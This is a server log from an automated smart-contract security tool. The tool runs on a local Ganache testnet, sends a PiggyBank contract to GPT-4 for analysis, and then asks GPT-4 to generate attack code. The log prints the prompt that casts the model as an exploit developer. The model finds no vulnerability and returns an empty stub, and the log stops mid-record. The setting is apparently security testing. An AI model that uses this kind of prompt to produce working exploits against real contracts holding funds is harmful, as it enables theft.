2025-06-21 15:59:10,458 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-21 15:59:10,623 - app.app - INFO - Application started
2025-06-21 15:59:10,634 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.30.0.5:8000
2025-06-21 15:59:10,635 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 16:00:16,553 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:16,579 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:16,586 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:16,589 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 16:00:16,595 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:16] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 16:00:16,610 - app.api.auth - INFO - Received login request with method: POST
2025-06-21 16:00:16,613 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-21 16:00:16,616 - app.api.auth - INFO - Request content type: application/json
2025-06-21 16:00:16,617 - app.api.auth - INFO - Processing JSON request
2025-06-21 16:00:16,619 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 16:00:17,082 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 16:00:17,086 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:17,088 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:17,090 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:17,091 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 16:00:17,093 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:17] "POST /login HTTP/1.1" 200 -
2025-06-21 16:00:28,922 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:28,931 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:28,935 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:28,938 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 16:00:28,943 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:28] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 16:00:28,967 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 16:00:28,978 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 16:00:28,992 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-21 16:00:29,003 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp6jsnfqht.sol
2025-06-21 16:00:29,016 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-21 16:00:29,018 - app.services.contract_service - INFO - Compiling contract...
2025-06-21 16:00:29,170 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 16:00:30,106 - solcx - INFO - Using solc version 0.8.0
2025-06-21 16:00:30,109 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 16:00:30,114 - solcx - INFO - Using solc version 0.8.0
2025-06-21 16:00:31,120 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-21 16:00:31,122 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-21 16:00:31,632 - app.services.contract_service - INFO - Contract PiggyBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-06-21 16:00:31,637 - app.services.contract_service - INFO - Setting up contract PiggyBank...
2025-06-21 16:00:31,861 - app.services.contract_service - INFO - Contract PiggyBank setup completed
2025-06-21 16:00:31,863 - app.services.contract_service - INFO - Funding contract PiggyBank for attack testing...
2025-06-21 16:00:32,324 - app.services.contract_service - INFO - Contract PiggyBank funded
2025-06-21 16:00:32,325 - app.services.contract_service - INFO - Building contract observation...
2025-06-21 16:00:32,601 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-21 16:00:32,602 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-21 16:00:32,604 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-21 16:00:32,618 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-21 16:00:32,644 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 191, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-21 16:00:32,645 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-21 16:00:32,646 - app.modules.attack_generator - INFO - Contract name: PiggyBank
2025-06-21 16:00:32,647 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-21 16:00:32,648 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-21 16:00:32,651 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 16:00:32,653 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 16:00:32,654 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 16:00:40,967 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 16:00:41,012 - app.modules.attack_generator - INFO - Received response from OpenAI API in 8.36 seconds
2025-06-21 16:00:41,022 - app.modules.attack_generator - INFO - Contract analysis completed in 8.36 seconds
2025-06-21 16:00:41,023 - app.modules.attack_generator - INFO - Vulnerability assessment: - **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forw...
2025-06-21 16:00:41,024 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-21 16:00:41,025 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 16:00:41,027 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 16:00:41,028 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 16:00:42,382 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 16:00:42,401 - app.modules.attack_generator - INFO - Received response from OpenAI API in 1.37 seconds
2025-06-21 16:00:42,407 - app.modules.attack_generator - INFO - Attack code generation completed in 1.37 seconds
2025-06-21 16:00:42,410 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 113
2025-06-21 16:00:42,412 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 9.73 seconds
2025-06-21 16:00:42,415 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-21 16:00:42,419 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp6jsnfqht.sol",\n  "contracts": [\n    {\n      "contract_name": "PiggyBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "stateMutability": "payable",\n          "type": "receive"\n        }\n      ],\n      "functions": [\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99990294240000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999578900000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "getBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract PiggyBank {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    // Recevoir des fonds\\n    receive() external payable {}\\n\\n    // Voir le solde du contrat\\n    function getBalance() public view returns (uint) {\\n        return address(this).balance;\\n    }\\n\\n    // Retirer les fonds, uniquement par le propri\\u00e9taire\\n    function withdraw() public {\\n        require(msg.sender == owner, \\"Not the owner\\");\\n        payable(owner).transfer(address(this).balance);\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `PiggyBank` is a simple wallet that can receive ETH via its `receive()` function. It stores an `owner` address set at deployment. The owner can withdraw all ETH from the contract by calling `withdraw()`. The contract also exposes a `getBalance()` view function to check the current ETH balance.\n\n- Solidity version: `pragma solidity ^0.8.0;`  \n- Key functions:  \n  - `receive() external payable` ‚Äî accepts ETH deposits.  \n  - `getBalance() public view returns (uint)` ‚Äî returns contract ETH balance.  \n  - `withdraw() public` ‚Äî transfers entire balance to the owner, only callable by the owner.\n\n2. Vulnerability Assessment:  \n- **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forwards a fixed 2300 gas stipend, preventing reentrant calls. Also, no state changes occur after the transfer call.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public setter or owner change function exists, so ownership cannot be hijacked after deployment.  \n- **Denial of Service:** The use of `transfer()` can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially blocking withdrawals. However, this is a known tradeoff and not necessarily a vulnerability.  \n- **Logic Bugs:** None detected. The contract logic is straightforward and minimal.  \n- **Math Errors:** Not applicable, no arithmetic operations.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe in Solidity 0.8.0 context.  \n- **Backdoors:** None found.  \n- **Economic Exploits:** None found.\n\n3. Exploitation Requirements:  \nNo exploitable vulnerabilities identified. The only way to withdraw funds is by the owner. An attacker cannot withdraw or lock funds. The contract holds 3 ETH currently, owned by `0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1`.\n\n---\n\n**Summary:**  \nThe `PiggyBank` contract is a minimal ETH holding wallet with proper owner-only withdrawal and no apparent vulnerabilities. It is secure under the given Solidity version and usage pattern.', 'contract_analysis': 'The contract `PiggyBank` is a simple wallet that can receive ETH via its `receive()` function. It stores an `owner` address set at deployment. The owner can withdraw all ETH from the contract by calling `withdraw()`. The contract also exposes a `getBalance()` view function to check the current ETH balance.\n\n- Solidity version: `pragma solidity ^0.8.0;`  \n- Key functions:  \n  - `receive() external payable` ‚Äî accepts ETH deposits.  \n  - `getBalance() public view returns (uint)` ‚Äî returns contract ETH balance.  \n  - `withdraw() public` ‚Äî transfers entire balance to the owner, only callable by the owner.\n\n2.', 'vulnerability_assessment': '- **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forwards a fixed 2300 gas stipend, preventing reentrant calls. Also, no state changes occur after the transfer call.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public setter or owner change function exists, so ownership cannot be hijacked after deployment.  \n- **Denial of Service:** The use of `transfer()` can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially blocking withdrawals. However, this is a known tradeoff and not necessarily a vulnerability.  \n- **Logic Bugs:** None detected. The contract logic is straightforward and minimal.  \n- **Math Errors:** Not applicable, no arithmetic operations.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe in Solidity 0.8.0 context.  \n- **Backdoors:** None found.  \n- **Economic Exploits:** None found.\n\n3.', 'exploitation_requirements': 'No exploitable vulnerabilities identified. The only way to withdraw funds is by the owner. An attacker cannot withdraw or lock funds. The contract holds 3 ETH currently, owned by `0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1`.', 'analysis_duration': 8.359328985214233}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `PiggyBank` is a simple wallet that can receive ETH via its `receive()` function. It stores an `owner` address set at deployment. The owner can withdraw all ETH from the contract by calling `withdraw()`. The contract also exposes a `getBalance()` view function to check the current ETH balance.\n\n- Solidity version: `pragma solidity ^0.8.0;`  \n- Key functions:  \n  - `receive() external payable` ‚Äî accepts ETH deposits.  \n  - `getBalance() public view returns (uint)` ‚Äî returns contract ETH balance.  \n  - `withdraw() public` ‚Äî transfers entire balance to the owner, only callable by the owner.\n\n2.\n\nVulnerability Assessment: - **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forwards a fixed 2300 gas stipend, preventing reentrant calls. Also, no state changes occur after the transfer call.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public setter or owner change function exists, so ownership cannot be hijacked after deployment.  \n- **Denial of Service:** The use of `transfer()` can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially blocking withdrawals. However, this is a known tradeoff and not necessarily a vulnerability.  \n- **Logic Bugs:** None detected. The contract logic is straightforward and minimal.  \n- **Math Errors:** Not applicable, no arithmetic operations.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe in Solidity 0.8.0 context.  \n- **Backdoors:** None found.  \n- **Economic Exploits:** None found.\n\n3.\n\nExploitation Requirements: No exploitable vulnerabilities identified. The only way to withdraw funds is by the owner. An attacker cannot withdraw or lock funds. The contract holds 3 ETH currently, owned by `0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1`.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address target) {}\n\n    function attack() external {}\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address target) {}\n\n    function attack() external {}\n}', 'code_type': 'solidity', 'attack_duration': 1.3740625381469727}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp6jsnfqht.sol",\n  "contracts": [\n    {\n      "contract_name": "PiggyBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "stateMutability": "payable",\n          "type": "receive"\n        }\n      ],\n      "functions": [\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99990294240000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999578900000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "getBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract PiggyBank {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    // Recevoir des fonds\\n    receive() external payable {}\\n\\n    // Voir le solde du contrat\\n    function getBalance() public view returns (uint) {\\n        return address(this).balance;\\n    }\\n\\n    // Retirer les fonds, uniquement par le propri\\u00e9taire\\n    function withdraw() public {\\n        require(msg.sender == owner, \\"Not the owner\\");\\n        payable(owner).transfer(address(this).balance);\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `PiggyBank` is a simple wallet that can receive ETH via its `receive()` function. It stores an `owner` address set at deployment. The owner can withdraw all ETH from the contract by calling `withdraw()`. The contract also exposes a `getBalance()` view function to check the current ETH balance.\n\n- Solidity version: `pragma solidity ^0.8.0;`  \n- Key functions:  \n  - `receive() external payable` ‚Äî accepts ETH deposits.  \n  - `getBalance() public view returns (uint)` ‚Äî returns contract ETH balance.  \n  - `withdraw() public` ‚Äî transfers entire balance to the owner, only callable by the owner.\n\n2. Vulnerability Assessment:  \n- **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forwards a fixed 2300 gas stipend, preventing reentrant calls. Also, no state changes occur after the transfer call.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public setter or owner change function exists, so ownership cannot be hijacked after deployment.  \n- **Denial of Service:** The use of `transfer()` can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially blocking withdrawals. However, this is a known tradeoff and not necessarily a vulnerability.  \n- **Logic Bugs:** None detected. The contract logic is straightforward and minimal.  \n- **Math Errors:** Not applicable, no arithmetic operations.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe in Solidity 0.8.0 context.  \n- **Backdoors:** None found.  \n- **Economic Exploits:** None found.\n\n3. Exploitation Requirements:  \nNo exploitable vulnerabilities identified. The only way to withdraw funds is by the owner. An attacker cannot withdraw or lock funds. The contract holds 3 ETH currently, owned by `0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1`.\n\n---\n\n**Summary:**  \nThe `PiggyBank` contract is a minimal ETH holding wallet with proper owner-only withdrawal and no apparent vulnerabilities. It is secure under the given Solidity version and usage pattern.', 'reasoning': 'The contract `PiggyBank` is a simple wallet that can receive ETH via its `receive()` function. It stores an `owner` address set at deployment. The owner can withdraw all ETH from the contract by calling `withdraw()`. The contract also exposes a `getBalance()` view function to check the current ETH balance.\n\n- Solidity version: `pragma solidity ^0.8.0;`  \n- Key functions:  \n  - `receive() external payable` ‚Äî accepts ETH deposits.  \n  - `getBalance() public view returns (uint)` ‚Äî returns contract ETH balance.  \n  - `withdraw() public` ‚Äî transfers entire balance to the owner, only callable by the owner.\n\n2.', 'summary': '- **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forwards a fixed 2300 gas stipend, preventing reentrant calls. Also, no state changes occur after the transfer call.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public setter or owner change function exists, so ownership cannot be hijacked after deployment.  \n- **Denial of Service:** The use of `transfer()` can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially blocking withdrawals. However, this is a known tradeoff and not necessarily a vulnerability.  \n- **Logic Bugs:** None detected. The contract logic is straightforward and minimal.  \n- **Math Errors:** Not applicable, no arithmetic operations.  \n- **Unsafe Calls:** The only external call is 